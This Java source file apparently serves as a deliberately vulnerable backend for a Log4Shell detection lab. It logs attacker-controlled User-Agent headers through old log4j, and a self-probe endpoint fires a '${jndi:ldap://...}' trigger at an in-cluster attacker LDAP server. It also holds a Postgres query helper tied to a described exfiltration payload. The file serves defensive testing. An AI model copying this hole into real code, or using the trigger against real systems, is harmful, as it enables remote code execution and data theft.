package io.fusioncore;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.sql.*;
import java.util.concurrent.Executors;

/**
 * Minimal HTTP API:
 *   GET  /api/products?q=...        — logs User-Agent through log4j (vulnerable surface)
 *   POST /api/login                 — accepts JSON {user,pass}, returns a fake JWT
 *   GET  /api/_probe                — self-fires the JNDI trigger at LDAP_TARGET
 *
 * Reads postgres connection settings from env (POSTGRES_HOST, POSTGRES_USER,
 * POSTGRES_DB). Trust auth assumed.
 *
 * LDAP_TARGET is where the malicious LDAP referral server lives — the location
 * the Log4Shell JNDI lookup dials out to. It is only a placeholder default
 * (attacker.attacker-ns.svc.cluster.local:1389, the in-repo attacker Service);
 * override it per deployment/namespace so this one image is portable to any
 * cluster layout without rebaking attack payloads.
 */
public class App {
    private static final Logger log = LogManager.getLogger(App.class);

    /** Where the malicious LDAP referral server is located (host:port). Overridable via env. */
    private static final String LDAP_TARGET =
        System.getenv().getOrDefault("LDAP_TARGET", "attacker.attacker-ns.svc.cluster.local:1389");

    public static void main(String[] args) throws IOException {
        int port = Integer.parseInt(System.getenv().getOrDefault("PORT", "8080"));
        HttpServer s = HttpServer.create(new InetSocketAddress(port), 0);
        s.createContext("/api/products", new ProductHandler());
        s.createContext("/api/login", new LoginHandler());
        s.createContext("/api/_probe", new ProbeHandler());
        s.setExecutor(Executors.newFixedThreadPool(4));
        s.start();
        log.info("chain-backend started on port {} (ldap_target={})", port, LDAP_TARGET);
    }

    static class ProductHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            String q = ex.getRequestURI().getQuery();
            String ua = ex.getRequestHeaders().getFirst("User-Agent");
            // The vulnerable line — log4j ≤ 2.14.1 will interpret ${jndi:…} here.
            log.info("product query q={} ua={}", q, ua);

            String body = "{\"products\":[]}";
            ex.sendResponseHeaders(200, body.length());
            try (OutputStream os = ex.getResponseBody()) { os.write(body.getBytes()); }
        }
    }

    /**
     * Self-probe: emits the JNDI trigger through the SAME vulnerable log4j line
     * as ProductHandler, aimed at the configured LDAP_TARGET. Lets a caller fire
     * one deterministic, off-profile LDAP egress (a falsifiability probe) without
     * deploying a separate attack pod — the destination is wherever LDAP_TARGET
     * points. On a patched build (scenario C) the string is logged literally and
     * no lookup happens, which is exactly the posture that endpoint demonstrates.
     */
    static class ProbeHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            String trigger = "${jndi:ldap://" + LDAP_TARGET + "/Probe}";
            log.info("self-probe q={} ua={}", "probe", trigger);
            String body = "{\"probe\":\"jndi:ldap://" + LDAP_TARGET + "/Probe\"}";
            ex.sendResponseHeaders(200, body.length());
            try (OutputStream os = ex.getResponseBody()) { os.write(body.getBytes()); }
        }
    }

    static class LoginHandler implements HttpHandler {
        public void handle(HttpExchange ex) throws IOException {
            // Accepts any creds, returns a fake JWT. Stage-1 auth is not the
            // detection focus in any scenario.
            String body = "{\"token\":\"fake.jwt.token\"}";
            ex.sendResponseHeaders(200, body.length());
            try (OutputStream os = ex.getResponseBody()) { os.write(body.getBytes()); }
        }
    }

    /**
     * Called by the Payload class (loaded via JNDI). In scenario A the
     * distroless backend is missing, so an /bin/sh-based exfil works.
     * In B the same Payload class loads but Runtime.exec() fails ENOENT.
     */
    public static String queryPostgresAndExfil(String host, String db, String user) {
        try (Connection c = DriverManager.getConnection("jdbc:postgresql://" + host + ":5432/" + db, user, "")) {
            try (Statement st = c.createStatement();
                 ResultSet rs = st.executeQuery("SELECT current_database()||':'||current_user||':'||substring(version(),1,40)")) {
                if (rs.next()) return rs.getString(1);
            }
        } catch (SQLException e) { return "PG_ERR:" + e.getMessage(); }
        return "";
    }
}
